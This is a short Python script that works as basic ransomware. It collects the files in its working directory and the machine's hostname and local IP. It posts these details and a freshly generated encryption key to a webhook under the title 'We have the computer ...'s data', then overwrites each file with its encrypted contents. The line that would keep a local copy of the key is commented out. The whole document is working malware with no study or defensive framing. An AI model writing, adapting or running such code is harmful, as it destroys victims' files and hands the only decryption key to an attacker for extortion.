import os
import requests
import json
from cryptography.fernet import Fernet
import socket

data = {
  #  "content" : "",
    "username" : "Bot"
}
files = []

webhook = "" #webhook
r = requests.get(webhook)


for file in os.listdir():
  if file == "main.py" or file == "thekey.key":
    continue
  if os.path.isfile(file):
    files.append(file)

print(files)

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

print(local_ip)
key = Fernet.generate_key()

message = "hostname: \n["+hostname+"] \n\n "+"ip:\n["+str(local_ip) +"]\n\nEncrypt Key: \n ["+str(key)+"]"

data["embeds"] = [
    {
        "description" :  str(message),
        "title" : "We have the computer "+str(local_ip)+("'s data"),
    }
]

result = requests.post(webhook, json = data)

#with open("thekey.key", "wb") as thekey:
#  thekey.write(key)
for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
  contentencrypted = Fernet(key).encrypt(contents)
  with open(file, "wb") as thefile:
    thefile.write(contentencrypted)
